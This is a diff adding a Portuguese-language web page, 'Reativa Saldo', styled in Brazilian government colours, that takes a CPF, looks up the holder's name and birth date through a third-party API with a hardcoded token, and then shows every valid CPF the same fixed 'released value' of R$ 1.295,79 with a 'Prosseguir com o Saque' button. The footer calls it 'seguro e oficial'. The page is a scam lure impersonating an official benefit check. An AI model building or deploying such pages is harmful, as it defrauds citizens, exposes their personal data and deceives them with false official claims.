@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reativa Saldo - Consulta Rápida</title>
+    <style>
+        /* Design moderno e bonito, focado na consulta, com cores gov.br */
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #f0f4f8, #ffffff); /* Gradiente suave para modernidade */
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: space-between;
+        }
+        header {
+            background-color: #004AC1; /* Azul principal */
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        header h1 {
+            font-size: 2.2em;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+        header p {
+            font-size: 1.1em;
+            margin: 5px 0 0;
+            opacity: 0.9;
+        }
+        main {
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+        .intro p {
+            font-size: 1em;
+            margin-bottom: 30px;
+            color: #555;
+        }
+        form#consultaForm {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        input[type="text"] {
+            width: 100%;
+            max-width: 300px;
+            padding: 12px 15px;
+            margin: 10px 0;
+            border: 2px solid #004AC1;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: #00843D; /* Verde no focus */
+            box-shadow: 0 0 8px rgba(0, 132, 61, 0.3);
+            outline: none;
+        }
+        button {
+            background-color: #004AC1;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.2s;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #00843D;
+            transform: scale(1.05);
+        }
+        #loading {
+            display: none;
+            margin: 20px 0;
+            font-size: 1.1em;
+            color: #FFD500; /* Amarelo para loading */
+            animation: fade 1.5s infinite;
+        }
+        @keyframes fade {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        #result {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: left;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+            font-size: 1em;
+            line-height: 1.5;
+        }
+        .success {
+            background-color: #e8f5e9; /* Verde claro moderno */
+            border: 1px solid #00843D;
+            color: #00843D;
+        }
+        .success strong {
+            color: #004AC1; /* Azul para destaques */
+        }
+        .success button {
+            margin-top: 15px;
+            width: 100%;
+            background-color: #FFD500; /* Amarelo para botão de prosseguir */
+            color: #333;
+        }
+        .success button:hover {
+            background-color: #ffc107;
+        }
+        .error {
+            background-color: #ffebee;
+            border: 1px solid #ff0000;
+            color: #ff0000;
+        }
+        footer {
+            background-color: #004AC1;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            font-size: 0.9em;
+            box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.1);
+        }
+        footer span {
+            background-color: #00843D;
+            padding: 3px 8px;
+            border-radius: 4px;
+            margin-left: 5px;
+        }
+        /* Responsivo */
+        @media (max-width: 500px) {
+            main { padding: 15px; margin: 20px; }
+            header h1 { font-size: 1.8em; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Reativa Saldo</h1>
+        <p>Consulte seu saldo disponível de forma rápida e segura.</p>
+    </header>
+
+    <main>
+        <div class="intro">
+            <p>De acordo com a Lei nº 14.897/24, verifique se você tem direito a valores liberados.</p>
+        </div>
+
+        <form id="consultaForm">
+            <input type="text" id="cpfInput" placeholder="Digite seu CPF (ex: 000.000.000-00)" required>
+            <button type="submit">Consultar Agora</button>
+        </form>
+
+        <div id="loading">Carregando...</div>
+        <div id="result"></div>
+    </main>
+
+    <footer>
+        <p>Sistema seguro e oficial <span>✔</span></p>
+    </footer>
+
+    <script>
+        const cpfInput = document.getElementById('cpfInput');
+        const form = document.getElementById('consultaForm');
+        const loading = document.getElementById('loading');
+        const resultDiv = document.getElementById('result');
+
+        // Máscara para CPF
+        cpfInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '').slice(0, 11);
+            value = value.replace(/(\d{3})(\d)/, '$1.$2')
+                         .replace(/(\d{3})(\d)/, '$1.$2')
+                         .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            e.target.value = value;
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const cpf = cpfInput.value.replace(/\D/g, '');
+
+            if (cpf.length !== 11 || isNaN(cpf)) {
+                resultDiv.innerHTML = 'CPF inválido. Deve conter 11 dígitos.';
+                resultDiv.className = 'error';
+                return;
+            }
+
+            loading.style.display = 'block';
+            resultDiv.innerHTML = '';
+            resultDiv.className = '';
+
+            const apiUrl = `https://ws.hubdodesenvolvedor.com.br/v2/nome_cpf/?cpf=${cpf}&token=179974000yNfnWPvraz324937600`;
+
+            fetch(apiUrl)
+                .then(response => {
+                    if (!response.ok) throw new Error('Erro na resposta da API');
+                    return response.json();
+                })
+                .then(data => {
+                    loading.style.display = 'none';
+                    if (data.status && data['return'] === 'OK') {
+                        const nome = data.result.nome;
+                        const dataNasc = data.result.data_de_nascimento;
+                        resultDiv.innerHTML = `
+                            <strong>Nome:</strong> ${nome}<br>
+                            <strong>Data:</strong> ${dataNasc}<br>
+                            <strong>Valor liberado da cota:</strong> R$ 1.295,79<br>
+                            <button onclick="alert('Em desenvolvimento')">Prosseguir com o Saque</button>
+                        `;
+                        resultDiv.className = 'success';
+                    } else {
+                        resultDiv.innerHTML = 'CPF não encontrado ou sem saldo disponível. Tente novamente.';
+                        resultDiv.className = 'error';
+                    }
+                })
+                .catch(error => {
+                    loading.style.display = 'none';
+                    resultDiv.innerHTML = `Erro na consulta: ${error.message}`;
+                    resultDiv.className = 'error';
+                });
+        });
+    </script>
+</body>
+</html>
